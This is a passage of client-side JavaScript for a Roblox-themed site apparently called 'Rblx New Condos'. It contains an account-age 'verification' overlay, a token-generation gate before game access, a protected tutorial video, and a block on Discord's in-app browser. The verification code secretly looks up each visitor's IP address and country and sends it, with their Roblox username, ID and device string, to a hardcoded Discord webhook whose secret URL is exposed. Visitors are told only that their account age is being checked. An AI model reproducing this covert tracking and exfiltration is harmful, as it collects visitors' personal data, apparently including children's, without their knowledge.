(function () {
  'use strict';

  /* ── Discord WebView detection ─────────────────────────── */
  var _ua = navigator.userAgent || '';
  var _isDiscordWebView = _ua.indexOf('Discord') !== -1;

  if (_isDiscordWebView) {
    var _dv = document.createElement('div');
    _dv.style.cssText = [
      'position:fixed','inset:0','z-index:999999','display:flex',
      'align-items:center','justify-content:center','background:rgba(10,5,5,0.95)',
      'font-family:Outfit,Inter,sans-serif','text-align:center'
    ].join(';');
    _dv.innerHTML =
      '<div style="max-width:360px;padding:2rem;background:linear-gradient(180deg,rgba(30,10,10,0.98) 0%,rgba(20,8,8,0.98) 100%);border:1px solid rgba(239,68,68,0.2);border-radius:1.5rem;box-shadow:0 40px 80px rgba(0,0,0,0.8)">'+
      '<span style="font-size:3rem;display:block;margin-bottom:1rem">\u26A0\uFE0F</span>'+
      '<div style="font-size:1.2rem;font-weight:800;color:#fff;margin-bottom:0.75rem">Open in Browser</div>'+
      '<div style="font-size:0.85rem;color:#a57d7d;line-height:1.6;margin-bottom:1.5rem">This site does not work inside Discord\'s in-app browser. Please open the link in Chrome, Safari, or your default browser.</div>'+
      '<div style="font-size:0.75rem;color:rgba(165,125,125,0.5)">Tip: Tap the three dots \u22EE and select "Open in Browser"</div>'+
      '</div>';
    document.documentElement.appendChild(_dv);
    return;
  }

  var LANG_KEY = 'rc2_lang';
  var PROFILE_KEY = 'rc_verified_profile';
  var MIN_ACCOUNT_DAYS = 80;
  var WEBHOOK_URL = 'https://discord.com/api/webhooks/1524874777947410513/Ng_v8NSNotO1CPGcDhWbYGiwdgzcGrv0h_-Lkv2D_vxQvJ_rorAooUFlSML-tgc6Qm_A';

  /* ── Sound ─────────────────────────────────────────────── */
  var audio = null;
  function playClick() {
    try {
      if (!audio) { audio = new Audio('/click-sound.mp3'); audio.volume = 0.5; }
      audio.currentTime = 0;
      audio.play().catch(function () {});
    } catch (e) {}
  }

  /* ── Token enforcement ─────────────────────────────────── */
  var tokenGeneratedInSession = false;
  var WARN_MSGS = {
    en: 'Generate a token first to access the game.',
    es: 'Genera un token primero para acceder al juego.',
    pt: 'Gere um token primeiro para acessar o jogo.',
    ru: '\u0421\u043d\u0430\u0447\u0430\u043b\u0430 \u0441\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u0442\u043e\u043a\u0435\u043d, \u0447\u0442\u043e\u0431\u044b \u0432\u043e\u0439\u0442\u0438 \u0432 \u0438\u0433\u0440\u0443.',
  };
  function showWarning() {
    var lang = localStorage.getItem(LANG_KEY) || 'en';
    var msg = WARN_MSGS[lang] || WARN_MSGS.en;
    var existing = document.getElementById('rc-token-warning');
    if (existing) return;
    var warn = document.createElement('div');
    warn.id = 'rc-token-warning';
    warn.style.cssText = [
      'position:fixed','bottom:24px','left:50%','transform:translateX(-50%)',
      'background:#1c2028','border:1px solid #ef4444','color:#fca5a5',
      'font-size:13px','font-weight:600','padding:10px 20px',
      'border-radius:12px','z-index:999999','white-space:nowrap',
      'box-shadow:0 4px 20px rgba(0,0,0,.6)','font-family:Inter,sans-serif'
    ].join(';');
    warn.textContent = msg;
    document.body.appendChild(warn);
    setTimeout(function () { warn.remove(); }, 2800);
  }

  /* ── Language overlay logic ────────────────────────────── */
  function dismissOverlay(lang) {
    localStorage.setItem(LANG_KEY, lang);
    var overlay = document.getElementById('rc-lang-overlay');
    if (overlay) {
      overlay.style.animation = 'rc-fadeout .2s ease forwards';
      setTimeout(function () { overlay.classList.add('rc-hidden'); }, 210);
    }
  }

  /* ── MutationObserver for buttons ──────────────────────── */
  var observer = new MutationObserver(function () {
    document.querySelectorAll('button:not([data-rc-s]), a:not([data-rc-s])').forEach(function (el) {
      el.setAttribute('data-rc-s', '1');
      el.addEventListener('click', playClick);
    });
    document.querySelectorAll('[data-testid="button-access-game"]:not([data-rc-e])').forEach(function (el) {
      el.setAttribute('data-rc-e', '1');
      el.addEventListener('click', function (e) {
        if (!tokenGeneratedInSession) { e.preventDefault(); e.stopImmediatePropagation(); showWarning(); }
      }, true);
    });
    document.querySelectorAll('[data-testid="button-generate-token"]:not([data-rc-t])').forEach(function (el) {
      el.setAttribute('data-rc-t', '1');
      el.addEventListener('click', function () { tokenGeneratedInSession = true; });
    });
  });
  document.addEventListener('click', function (e) {
    var t = e.target;
    if (!t) return;
    if ((t.tagName === 'BUTTON' && t.dataset && t.dataset.testid === 'button-close-modal') || t.id === 'rc-lang-overlay') {
      tokenGeneratedInSession = false;
    }
  }, true);
  document.querySelectorAll('#rc-lang-overlay .rc-btn').forEach(function (btn) {
    btn.addEventListener('click', function () { playClick(); dismissOverlay(btn.dataset.lang); });
  });

  /* ══════════════════════════════════════════════════════════
     PROMO VIDEO SECTION
     Injected before the games grid, with download protection
     ══════════════════════════════════════════════════════════ */

  var PROMO_VIDEO_URL = 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663824589529/ygcRwKNTvdTMMbiH.mp4';
  var promoVideoInjected = false;

  function injectPromoVideo() {
    if (promoVideoInjected) return;
    promoVideoInjected = true;

    /* Find the main content area and inject before the games section */
    var main = document.querySelector('main');
    if (!main) { main = document.getElementById('root'); }
    if (!main) return;

    /* Find the featured games section to insert before it */
    var gameSection = main.querySelector('section:nth-child(2)') || main.querySelector('h2');
    if (!gameSection) {
      /* Fallback: append at end of main */
      gameSection = main;
    }

    var videoSection = document.createElement('section');
    videoSection.id = 'rc-promo-video';
    videoSection.style.cssText = [
      'margin-bottom:2rem','opacity:0','transform:translateY(20px)',
      'transition:opacity 0.6s ease, transform 0.6s ease'
    ].join(';');

    /* Title */
    var titleDiv = document.createElement('div');
    titleDiv.style.cssText = [
      'margin-bottom:1rem','opacity:0','transition:opacity 0.5s ease 0.1s'
    ].join(';');

    var h2 = document.createElement('h2');
    h2.className = 'text-xl font-bold text-white mb-1';
    h2.textContent = 'Tutorial';
    titleDiv.appendChild(h2);
    videoSection.appendChild(titleDiv);

    /* Video container with protection overlay */
    var vidContainer = document.createElement('div');
    vidContainer.style.cssText = [
      'position:relative','width:100%','max-width:700px','margin:0 auto',
      'border-radius:1rem','overflow:hidden','border:1px solid rgba(239,68,68,0.2)',
      'box-shadow:0 20px 60px rgba(0,0,0,0.6),0 0 40px rgba(220,38,38,0.08)',
      'opacity:0','transform:translateY(16px)',
      'transition:opacity 0.5s ease 0.2s, transform 0.5s ease 0.2s'
    ].join(';');

    /* Invisible overlay to block right-click and drag */
    var clickShield = document.createElement('div');
    clickShield.style.cssText = [
      'position:absolute','inset:0','z-index:10','cursor:default'
    ].join(';');
    clickShield.style.pointerEvents = 'none';
    clickShield.setAttribute('oncontextmenu', 'return false;');
    clickShield.addEventListener('contextmenu', function (e) { e.preventDefault(); });

    /* Drag shield */
    var dragShield = document.createElement('div');
    dragShield.style.cssText = [
      'position:absolute','inset:0','z-index:11','pointer-events:none'
    ].join(';');
    dragShield.addEventListener('dragstart', function (e) { e.preventDefault(); });

    /* Video element */
    var video = document.createElement('video');
    video.autoplay = false;
    video.muted = false;
    video.loop = true;
    video.playsInline = true;
    video.controls = false;
    video.setAttribute('controlsList', 'nodownload nofullscreen noremoteplayback');
    video.setAttribute('disablePictureInPicture', 'true');
    video.setAttribute('draggable', 'false');
    video.preload = 'metadata';
    video.style.cssText = [
      'width:100%','display:block','border-radius:1rem','pointer-events:auto'
    ].join(';');

    /* Block context menu on video */
    video.addEventListener('contextmenu', function (e) { e.preventDefault(); });
    video.addEventListener('dragstart', function (e) { e.preventDefault(); });
    video.addEventListener('selectstart', function (e) { e.preventDefault(); });

    /* Play button overlay
       PC: invisible → appears on hover, hides after 3s (mouse leave) or 4s (mouse still)
       Mobile: invisible → appears on tap, hides after 4s of inactivity, tap toggles play/pause
     */
    var playBtn = document.createElement('div');
    playBtn.style.cssText = [
      'position:absolute','inset:0','z-index:12','display:flex','align-items:center',
      'justify-content:center','cursor:pointer','background:rgba(0,0,0,0.3)',
      'transition:opacity 0.4s ease','opacity:0','-webkit-tap-highlight-color:transparent',
      'user-select:none','-webkit-user-select:none'
    ].join(';');

    var playIcon = document.createElement('div');
    playIcon.style.cssText = [
      'width:64px','height:64px','border-radius:50%',
      'background:rgba(220,38,38,0.9)','display:flex','align-items:center',
      'justify-content:center','box-shadow:0 0 30px rgba(220,38,38,0.5)',
      'transition:all 0.2s ease'
    ].join(';');
    playIcon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>';
    playBtn.appendChild(playIcon);

    /* Auto-hide timeout logic */
    var autoHideTimer = null;
    var stillTimer = null;
    var lastMouseX = 0, lastMouseY = 0;
    var isHovering = false;
    var isTouchDevice = ('ontouchstart' in window) || navigator.maxTouchPoints > 0;

    function hideControls() {
      playBtn.style.opacity = '0';
      playBtn.style.background = 'rgba(0,0,0,0)';
    }

    function showControls() {
      playBtn.style.opacity = '1';
      playBtn.style.background = 'rgba(0,0,0,0.3)';
    }

    function scheduleAutoHide(ms) {
      if (autoHideTimer) clearTimeout(autoHideTimer);
      autoHideTimer = setTimeout(hideControls, ms);
    }

    function scheduleStillTimer() {
      if (stillTimer) clearTimeout(stillTimer);
      stillTimer = setTimeout(hideControls, 4000);
    }

    function resetStillTimer() {
      if (stillTimer) clearTimeout(stillTimer);
    }

    function cancelAllTimers() {
      if (autoHideTimer) clearTimeout(autoHideTimer);
      if (stillTimer) clearTimeout(stillTimer);
    }

    function togglePlay() {
      cancelAllTimers();
      if (video.paused) {
        video.play();
        playIcon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="white"><rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/></svg>';
      } else {
        video.pause();
        playIcon.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>';
      }
    }

    if (!isTouchDevice) {
      /* ── PC: hover-based controls ── */
      vidContainer.addEventListener('mouseenter', function () {
        isHovering = true;
        cancelAllTimers();
        showControls();
        lastMouseX = 0;
        lastMouseY = 0;
        scheduleStillTimer();
      });

      vidContainer.addEventListener('mousemove', function (e) {
        if (e.clientX !== lastMouseX || e.clientY !== lastMouseY) {
          lastMouseX = e.clientX;
          lastMouseY = e.clientY;
          resetStillTimer();
          scheduleStillTimer();
        }
      });

      vidContainer.addEventListener('mouseleave', function () {
        isHovering = false;
        cancelAllTimers();
        scheduleAutoHide(3000);
      });

      playBtn.addEventListener('click', function () {
        togglePlay();
        if (isHovering) scheduleStillTimer();
      });

    } else {
      /* ── Mobile: tap-based controls ── */
      /* Show play button briefly when video loads (paused state) */
      showControls();
      scheduleStillTimer();

      /* Tap to toggle play/pause */
      playBtn.addEventListener('click', function () {
        togglePlay();
        cancelAllTimers();
        scheduleStillTimer();
      });

      /* Touch start also shows controls */
      vidContainer.addEventListener('touchstart', function () {
        cancelAllTimers();
        showControls();
        scheduleStillTimer();
      });

      /* Touch move resets timer */
      vidContainer.addEventListener('touchmove', function () {
        resetStillTimer();
        scheduleStillTimer();
      });

      /* Touch end starts timer */
      vidContainer.addEventListener('touchend', function () {
        scheduleStillTimer();
      });
    }

    /* Click shield should not block play button */
    var shieldInner = document.createElement('div');
    shieldInner.style.cssText = [
      'position:absolute','inset:0','z-index:10'
    ].join(';');
    clickShield.appendChild(shieldInner);

    vidContainer.appendChild(clickShield);
    vidContainer.appendChild(dragShield);
    vidContainer.appendChild(video);
    vidContainer.appendChild(playBtn);

    videoSection.appendChild(vidContainer);

    /* Try to use blob URL for extra protection */
    try {
      fetch(PROMO_VIDEO_URL)
        .then(function (r) { return r.blob(); })
        .then(function (blob) {
          video.src = URL.createObjectURL(blob);
        })
        .catch(function () {
          /* Fallback to direct URL */
          video.src = PROMO_VIDEO_URL;
        });
    } catch (e) {
      video.src = PROMO_VIDEO_URL;
    }

    /* Insert before games section */
    if (gameSection.id === 'root') {
      gameSection.appendChild(videoSection);
    } else {
      gameSection.parentNode.insertBefore(videoSection, gameSection);
    }

    /* Fade in animation */
    setTimeout(function () {
      videoSection.style.opacity = '1';
      videoSection.style.transform = 'translateY(0)';
      titleDiv.style.opacity = '1';
      vidContainer.style.opacity = '1';
      vidContainer.style.transform = 'translateY(0)';
    }, 100);

    /* Global protection: block context menu on the entire video section */
    videoSection.addEventListener('contextmenu', function (e) { e.preventDefault(); });
  }

  /* ══════════════════════════════════════════════════════════
     ROBLOX PROFILE VERIFICATION SYSTEM
     ══════════════════════════════════════════════════════════ */

  /* ── Send log to Discord webhook ───────────────────────── */
  function sendVerificationLog(data) {
    var statusEmoji = data.accountAgeOk ? '\u2705' : data.found ? '\uD83D\uDEAB' : '\u274C';
    var statusText = data.accountAgeOk ? 'Verified (80+ days)' : data.found ? 'Blocked (< 80 days)' : 'Not Found';
    var color = data.accountAgeOk ? 2278782 : data.found ? 16355294 : 15686104;

    var fields = [
      { name: 'Status', value: statusEmoji + ' **' + statusText + '**', inline: true },
      { name: 'Username', value: data.username || 'unknown', inline: true },
    ];
    if (data.displayName) fields.push({ name: 'Display Name', value: data.displayName, inline: true });
    if (data.userId) fields.push({ name: 'User ID', value: String(data.userId), inline: true });
    if (data.daysOld !== undefined) fields.push({ name: 'Account Age', value: String(data.daysOld) + ' days', inline: true });
    if (data.createdFormatted) fields.push({ name: 'Created', value: data.createdFormatted, inline: true });
    if (data.hasVerifiedBadge !== undefined) fields.push({ name: 'Verified Badge', value: data.hasVerifiedBadge ? 'Yes \u2705' : 'No \u274C', inline: true });

    fetch('https://ipapi.co/json/')
      .then(function (r) { return r.ok ? r.json() : null; })
      .then(function (ipData) {
        if (ipData && ipData.country_code) {
          var flag = String.fromCodePoint.apply(null, ipData.country_code.split('').map(function (c) { return c.charCodeAt(0) + 127397; }));
          fields.push({ name: 'IP Address', value: (flag + ' ' + ipData.ip + ' \u2014 ' + ipData.country_name).trim(), inline: true });
        } else {
          fields.push({ name: 'IP Address', value: 'unknown', inline: true });
        }
      })
      .catch(function () { fields.push({ name: 'IP Address', value: 'unknown', inline: true }); })
      .then(function () {
        fields.push({ name: 'Device', value: '`' + navigator.userAgent.substring(0, 100) + '`', inline: false });
        fields.push({ name: 'Time', value: new Date().toISOString(), inline: true });

        var embed = {
          title: '\uD83D\uDD0D Profile Verification',
          description: '**New visitor entered the site and attempted profile verification.**\nAll information captured in a single log.',
          color: color,
          fields: fields,
          footer: { text: 'Rblx New Condos \u2014 Verification Log' },
          timestamp: new Date().toISOString(),
        };

        sendWebhook(embed);
      });
  }

  function sendWebhook(embed) {
    for (var attempt = 0; attempt < 3; attempt++) {
      (function (a) {
        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] }),
        })
        .then(function (r) {
          if (r.status === 429 && a < 2) {
            var retry = r.headers.get('retry-after') || '2';
            setTimeout(function () { sendWebhook(embed); }, parseInt(retry) * 1000 + 500);
            return;
          }
        })
        .catch(function () {
          if (a < 2) setTimeout(function () { sendWebhook(embed); }, 2000);
        });
      })(attempt);
    }
  }

  /* ══════════════════════════════════════════════════════════
     CACHE (localStorage, 30 min TTL)
     ══════════════════════════════════════════════════════════ */
  var CACHE_TTL = 30 * 60 * 1000;

  function getCache(key) {
    try {
      var raw = localStorage.getItem('rc_' + key);
      if (!raw) return null;
      var entry = JSON.parse(raw);
      if (Date.now() - entry.ts > CACHE_TTL) { localStorage.removeItem('rc_' + key); return null; }
      return entry.data;
    } catch (e) { return null; }
  }
  function setCache(key, data) {
    try { localStorage.setItem('rc_' + key, JSON.stringify({ data: data, ts: Date.now() })); } catch (e) {}
  }

  /* ══════════════════════════════════════════════════════════
     FETCH WITH RETRY (exponential backoff, handles 429)
     ══════════════════════════════════════════════════════════ */
  function fetchWithRetry(url, options, maxRetries) {
    if (maxRetries === undefined) maxRetries = 4;
    return new Promise(function (resolve, reject) {
      function attempt(n) {
        fetch(url, options)
          .then(function (r) {
            if (r.status === 429 && n < maxRetries) {
              var retryAfter = r.headers.get('retry-after');
              var wait = retryAfter ? parseInt(retryAfter) * 1000 : 2000 * Math.pow(2, n);
              setTimeout(function () { attempt(n + 1); }, wait);
              return;
            }
            if (r.ok) { r.json().then(resolve).catch(reject); return; }
            if (r.status === 404) {
              r.text().then(function (txt) {
                try { resolve(JSON.parse(txt)); } catch (e) { reject(new Error('HTTP 404')); }
              }).catch(function () { reject(new Error('HTTP 404')); });
              return;
            }
            reject(new Error('HTTP ' + r.status));
          })
          .catch(function (err) {
            if (n < maxRetries) {
              setTimeout(function () { attempt(n + 1); }, 2000 * Math.pow(2, n));
            } else {
              reject(err);
            }
          });
      }
      attempt(0);
    });
  }

  /* ══════════════════════════════════════════════════════════
     PRIMARY: /api/verify serverless (handles rate limits)
     FALLBACK: roproxy.com direct
     ══════════════════════════════════════════════════════════ */

  function tryServerless(username) {
    var cacheKey = 'u:' + username.toLowerCase();
    var cached = getCache(cacheKey);
    if (cached) {
      return Promise.resolve(cached);
    }
    return fetchWithRetry('/api/verify?username=' + encodeURIComponent(username))
      .then(function (data) {
        if (data.type === 'full') setCache(cacheKey, data);
        return data;
      });
  }

  function getAvatarServerless(userId) {
    var cacheKey = 'a:' + userId;
    var cached = getCache(cacheKey);
    if (cached) return Promise.resolve(cached.imageUrl || null);
    return fetchWithRetry('/api/verify?avatarId=' + userId)
      .then(function (data) {
        if (data.imageUrl) setCache(cacheKey, { imageUrl: data.imageUrl });
        return data.imageUrl || null;
      });
  }

  /* ── Fallback: roproxy ─────────────────────────────────── */
  var USERS_PROXY = 'https://users.roproxy.com';
  var THUMB_PROXY = 'https://thumbnails.roproxy.com';

  function roproxySearch(username) {
    return fetchWithRetry(USERS_PROXY + '/v1/usernames/users', {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: JSON.stringify({ usernames: [username] }),
    });
  }
  function roproxyProfile(userId) {
    return fetchWithRetry(USERS_PROXY + '/v1/users/' + userId);
  }
  function roproxyAvatar(userId) {
    return fetchWithRetry(THUMB_PROXY + '/v1/users/avatar-headshot?userIds=' + userId + '&size=150x150&format=Png&isCircular=false')
      .then(function (data) { return data.data && data.data.length > 0 ? data.data[0].imageUrl : null; });
  }

  /* ── Unified verify (serverless first, then roproxy) ───── */
  function doVerification(username) {
    return tryServerless(username)
      .then(function (data) {
        if (data.error) {
          if (data.error.indexOf('rate-limited') !== -1) {
            throw new Error('429');
          }
          if (data.error.indexOf('not found') !== -1) {
            sendVerificationLog({ username: username, found: false, accountAgeOk: false });
            throw new Error('User not found. Please check the username and try again.');
          }
          throw new Error(data.error);
        }
        sendVerificationLog({
          username: data.name || username,
          displayName: data.displayName,
          userId: data.id,
          daysOld: data.daysOld,
          createdFormatted: data.createdFormatted,
          accountAgeOk: data.accountAgeOk,
          hasVerifiedBadge: data.hasVerifiedBadge,
          found: true,
        });
        return data;
      })
      .catch(function (err) {
        if (err.message === 'User not found. Please check the username and try again.') throw err;
        if (err.message === '429') throw err;

        return roproxySearch(username)
          .then(function (searchData) {
            if (!searchData.data || searchData.data.length === 0) {
              sendVerificationLog({ username: username, found: false, accountAgeOk: false });
              throw new Error('User not found. Please check the username and try again.');
            }
            var user = searchData.data[0];
            return roproxyProfile(user.id);
          })
          .then(function (profile) {
            var createdDate = new Date(profile.created);
            var now = new Date();
            var daysOld = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24));
            var createdStr = createdDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });

            var result = {
              type: 'full',
              id: profile.id,
              name: profile.name,
              displayName: profile.displayName,
              created: profile.created,
              createdFormatted: createdStr,
              daysOld: daysOld,
              accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS,
              hasVerifiedBadge: profile.hasVerifiedBadge,
            };
            setCache('u:' + username.toLowerCase(), result);

            sendVerificationLog({
              username: profile.name,
              displayName: profile.displayName,
              userId: profile.id,
              daysOld: daysOld,
              createdFormatted: createdStr,
              accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS,
              hasVerifiedBadge: profile.hasVerifiedBadge,
              found: true,
            });

            return result;
          });
      });
  }

  /* ── Profile verification overlay ──────────────────────── */
  function showProfileVerification() {
    if (document.getElementById('rc-profile-overlay')) return;

    var overlay = document.createElement('div');
    overlay.id = 'rc-profile-overlay';

    var style = document.createElement('style');
    style.textContent = [
      '@keyframes rc-fadein{from{opacity:0}to{opacity:1}}',
      '@keyframes rc-fadeout{from{opacity:1}to{opacity:0}}',
      '@keyframes rc-slideup{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}',
      '@keyframes rc-pulse{0%,100%{box-shadow:0 0 0 0 rgba(239,68,68,0.5)}50%{box-shadow:0 0 20px 5px rgba(239,68,68,0.3)}}',
      '@keyframes rc-spin{to{transform:rotate(360deg)}}',
      '#rc-profile-overlay{position:fixed;inset:0;z-index:100000;display:flex;align-items:center;justify-content:center;background:rgba(10,5,5,0.92);backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);font-family:Outfit,Inter,sans-serif;animation:rc-fadein .3s ease}',
      '.rc-profile-card{width:420px;max-width:90vw;background:linear-gradient(180deg,rgba(30,10,10,0.98) 0%,rgba(20,8,8,0.98) 100%);border:1px solid rgba(239,68,68,0.2);border-radius:1.5rem;padding:2.5rem;box-shadow:0 0 0 1px rgba(239,68,68,0.08),0 40px 80px rgba(0,0,0,0.8),0 0 100px rgba(220,38,38,0.08),inset 0 1px 0 rgba(255,255,255,0.05);animation:rc-slideup .4s cubic-bezier(0.4,0,0.2,1);position:relative;overflow:hidden}',
      '.rc-profile-card::before{content:"";position:absolute;top:0;left:20%;right:20%;height:1px;background:linear-gradient(90deg,transparent,rgba(248,113,113,0.6),transparent)}',
      '.rc-profile-title{text-align:center;font-size:1.3rem;font-weight:800;color:#fff;margin-bottom:0.5rem;letter-spacing:-0.02em}',
      '.rc-profile-subtitle{text-align:center;font-size:0.85rem;color:#a57d7d;margin-bottom:1.5rem;letter-spacing:0.01em}',
      '.rc-profile-input{width:100%;padding:14px 18px;background:rgba(220,38,38,0.06);border:1px solid rgba(239,68,68,0.25);border-radius:0.9rem;color:#fff;font-size:1rem;font-family:Outfit,Inter,sans-serif;outline:none;transition:all 0.25s ease;letter-spacing:0.01em}',
      '.rc-profile-input:focus{border-color:rgba(239,68,68,0.5);box-shadow:0 0 0 1px rgba(239,68,68,0.15),0 0 20px rgba(239,68,68,0.1)}',
      '.rc-profile-input::placeholder{color:rgba(252,165,165,0.4)}',
      '.rc-profile-btn{width:100%;padding:14px;background:linear-gradient(135deg,#991b1b 0%,#dc2626 60%,#b91c1c 100%);border:none;border-radius:0.9rem;color:#fff;font-size:0.95rem;font-weight:700;cursor:pointer;font-family:Outfit,Inter,sans-serif;transition:all 0.25s ease;box-shadow:0 0 0 1px rgba(239,68,68,0.3),0 4px 20px rgba(220,38,38,0.4),inset 0 1px 0 rgba(255,255,255,0.15);letter-spacing:0.01em;margin-top:1rem}',
      '.rc-profile-btn:hover{background:linear-gradient(135deg,#b91c1c 0%,#f87171 60%,#dc2626 100%);box-shadow:0 0 0 1px rgba(248,113,113,0.5),0 6px 30px rgba(239,68,68,0.55),inset 0 1px 0 rgba(255,255,255,0.2);transform:translateY(-1px)}',
      '.rc-profile-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none;box-shadow:none}',
      '.rc-profile-error{text-align:center;font-size:0.85rem;color:#fca5a5;margin-top:1rem;display:none}',
      '.rc-profile-loader{text-align:center;margin-top:1.5rem;display:none}',
      '.rc-spinner{width:36px;height:36px;border:3px solid rgba(239,68,68,0.15);border-top-color:#ef4444;border-radius:50%;animation:rc-spin 0.8s linear infinite;margin:0 auto}',
      '.rc-profile-hint{text-align:center;font-size:0.75rem;color:rgba(165,125,125,0.6);margin-top:1rem;line-height:1.5}',
      '.rc-profile-display{display:none;text-align:center;padding:1rem 0}',
      '.rc-avatar{width:100px;height:100px;border-radius:1rem;object-fit:cover;border:2px solid rgba(239,68,68,0.3);box-shadow:0 0 30px rgba(239,68,68,0.2)}',
      '.rc-profile-name{font-size:1.5rem;font-weight:800;color:#fff;margin-top:0.75rem;letter-spacing:-0.02em}',
      '.rc-profile-id{font-size:0.8rem;color:rgba(252,165,165,0.6);margin-top:0.25rem}',
      '.rc-profile-stats{display:flex;justify-content:center;gap:2rem;margin-top:1.25rem}',
      '.rc-stat{text-align:center}',
      '.rc-stat-value{font-size:1.3rem;font-weight:700;color:#f87171}',
      '.rc-stat-label{font-size:0.7rem;color:#a57d7d;text-transform:uppercase;letter-spacing:0.05em;margin-top:0.2rem}',
      '.rc-profile-age-ok{color:#86efac!important}',
      '.rc-profile-age-bad{color:#fca5a5!important;animation:rc-pulse 2s infinite}',
      '.rc-profile-actions{margin-top:1.5rem;display:none;gap:0.75rem}',
      '.rc-btn-primary{flex:1;padding:12px;background:linear-gradient(135deg,#991b1b 0%,#dc2626 60%,#b91c1c 100%);border:none;border-radius:0.9rem;color:#fff;font-size:0.9rem;font-weight:700;cursor:pointer;font-family:Outfit,Inter,sans-serif;transition:all 0.25s ease;box-shadow:0 0 0 1px rgba(239,68,68,0.3),0 4px 20px rgba(220,38,38,0.4)}',
      '.rc-btn-primary:hover{background:linear-gradient(135deg,#b91c1c 0%,#f87171 60%,#dc2626 100%);box-shadow:0 0 0 1px rgba(248,113,113,0.5),0 6px 30px rgba(239,68,68,0.55);transform:translateY(-1px)}',
      '.rc-btn-primary:disabled{opacity:0.4;cursor:not-allowed;transform:none}',
      '.rc-btn-secondary{flex:1;padding:12px;background:rgba(220,38,38,0.08);border:1px solid rgba(239,68,68,0.22);border-radius:0.9rem;color:#fff;font-size:0.9rem;font-weight:600;cursor:pointer;font-family:Outfit,Inter,sans-serif;transition:all 0.25s ease}',
      '.rc-btn-secondary:hover{background:rgba(239,68,68,0.14);border-color:rgba(239,68,68,0.4)}',
      '.rc-blocked-msg{text-align:center;margin-top:1.25rem;display:none}',
      '.rc-blocked-msg p{font-size:0.9rem;color:#fca5a5;font-weight:600}',
      '.rc-blocked-msg small{font-size:0.75rem;color:#a57d7d;display:block;margin-top:0.4rem}',
      '.rc-shield-icon{font-size:3rem;margin-bottom:0.5rem;display:block}'
    ].join('\n');
    overlay.appendChild(style);

    var card = document.createElement('div');
    card.className = 'rc-profile-card';

    var form = document.createElement('div');
    form.id = 'rc-verify-form';
    form.className = 'rc-profile-form';
    form.innerHTML =
      '<div class="rc-profile-title">Roblox Profile Verification</div>' +
      '<div class="rc-profile-subtitle">Enter your Roblox username to verify your account age</div>' +
      '<input type="text" class="rc-profile-input" id="rc-username-input" placeholder="Enter your Roblox username" autocomplete="off" spellcheck="false">' +
      '<button class="rc-profile-btn" id="rc-verify-btn" onclick="__rcVerify()">Verify Profile</button>' +
      '<div class="rc-profile-error" id="rc-verify-error"></div>' +
      '<div class="rc-profile-loader" id="rc-verify-loader"><div class="rc-spinner"></div></div>' +
      '<div class="rc-profile-hint">Minimum account age required: <strong>' + MIN_ACCOUNT_DAYS + ' days</strong></div>';
    card.appendChild(form);

    var display = document.createElement('div');
    display.id = 'rc-profile-display';
    display.className = 'rc-profile-display';
    display.innerHTML =
      '<img class="rc-avatar" id="rc-avatar" src="" alt="Avatar">' +
      '<div class="rc-profile-name" id="rc-display-name"></div>' +
      '<div class="rc-profile-id" id="rc-user-id"></div>' +
      '<div class="rc-profile-stats">' +
        '<div class="rc-stat"><div class="rc-stat-value" id="rc-days-old"></div><div class="rc-stat-label">Days Old</div></div>' +
        '<div class="rc-stat"><div class="rc-stat-value" id="rc-created"></div><div class="rc-stat-label">Created</div></div>' +
      '</div>' +
      '<div class="rc-profile-actions" id="rc-actions"></div>' +
      '<div class="rc-blocked-msg" id="rc-blocked">' +
        '<span class="rc-shield-icon">\uD83D\uDEE1\uFE0F</span>' +
        '<p>Account Too New</p>' +
        '<small>Your Roblox account must be at least ' + MIN_ACCOUNT_DAYS + ' days old to access this site.</small>' +
        '<small>Please create a new account and wait for it to age before returning.</small>' +
      '</div>';
    card.appendChild(display);

    overlay.appendChild(card);
    document.body.appendChild(overlay);

    document.getElementById('rc-username-input').addEventListener('keydown', function (e) {
      if (e.key === 'Enter') { e.preventDefault(); __rcVerify(); }
    });
  }

  /* ── Verification logic ────────────────────────────────── */
  window.__rcVerify = function () {
    var input = document.getElementById('rc-username-input');
    var username = input.value.trim();
    var btn = document.getElementById('rc-verify-btn');
    var error = document.getElementById('rc-verify-error');
    var loader = document.getElementById('rc-verify-loader');

    if (!username) { error.style.display = 'block'; error.textContent = 'Please enter a Roblox username.'; return; }

    btn.disabled = true;
    btn.textContent = 'Verifying...';
    error.style.display = 'none';
    loader.style.display = 'block';

    doVerification(username)
      .then(function (data) {
        loader.style.display = 'none';
        btn.disabled = false;
        btn.textContent = 'Verify Profile';

        var daysEl = document.getElementById('rc-days-old');
        daysEl.textContent = data.daysOld;
        daysEl.className = 'rc-stat-value ' + (data.accountAgeOk ? 'rc-profile-age-ok' : 'rc-profile-age-bad');

        document.getElementById('rc-verify-form').style.display = 'none';
        document.getElementById('rc-profile-display').style.display = 'block';

        document.getElementById('rc-display-name').textContent = data.name;
        document.getElementById('rc-user-id').textContent = 'ID: ' + data.id;
        document.getElementById('rc-created').textContent = data.createdFormatted;

        /* Get avatar (non-blocking) */
        var avatarUrl = data.imageUrl || null;
        if (avatarUrl) {
          document.getElementById('rc-avatar').src = avatarUrl;
        } else {
          getAvatarServerless(data.id)
            .then(function (url) {
              if (url) { document.getElementById('rc-avatar').src = url; return; }
              roproxyAvatar(data.id).then(function (u) { if (u) document.getElementById('rc-avatar').src = u; }).catch(function () {});
            })
            .catch(function () {
              roproxyAvatar(data.id).then(function (u) { if (u) document.getElementById('rc-avatar').src = u; }).catch(function () {});
            });
        }

